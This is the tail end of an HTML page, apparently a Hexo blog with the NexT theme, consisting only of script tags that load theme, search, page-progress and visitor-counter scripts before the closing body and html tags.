<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
